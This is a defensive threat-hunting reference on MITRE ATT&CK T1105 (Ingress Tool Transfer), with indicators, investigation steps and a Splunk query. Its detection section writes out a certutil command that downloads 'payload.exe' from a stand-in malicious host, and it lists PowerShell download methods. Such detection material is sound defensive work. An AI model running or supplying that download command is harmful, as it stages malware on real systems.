# T1105 - Ingress Tool Transfer

## Description

Adversaries may transfer tools, malware, scripts, or payloads from external systems into a compromised environment.

This technique is commonly observed during malware deployment, ransomware staging, and post-exploitation activities.

## Common Tools

* PowerShell
* certutil.exe
* bitsadmin.exe
* curl.exe
* wget
* Invoke-WebRequest

## Common Indicators

* Downloads from suspicious domains
* Unexpected executable downloads
* PowerShell download commands
* Certutil file downloads
* Downloads to temporary directories

## Detection Opportunities

### PowerShell

* Invoke-WebRequest
* DownloadString
* WebClient.DownloadFile

### Certutil

```cmd
certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe
```

### BITSAdmin

```cmd
bitsadmin /transfer
```

## Investigation Steps

1. Review process creation logs.
2. Review command-line arguments.
3. Review downloaded files.
4. Review DNS activity.
5. Review proxy and web logs.
6. Identify source URL or IP address.
7. Determine whether the downloaded file executed.

## Related ATT&CK Techniques

* T1059 Command and Scripting Interpreter
* T1027 Obfuscated Files or Information
* T1486 Data Encrypted for Impact
* T1003 Credential Dumping

## Splunk Hunting Example

```spl
index=sysmon EventCode=1
(Image="*powershell.exe" OR Image="*certutil.exe" OR Image="*bitsadmin.exe")
| table _time Computer User Image CommandLine
```

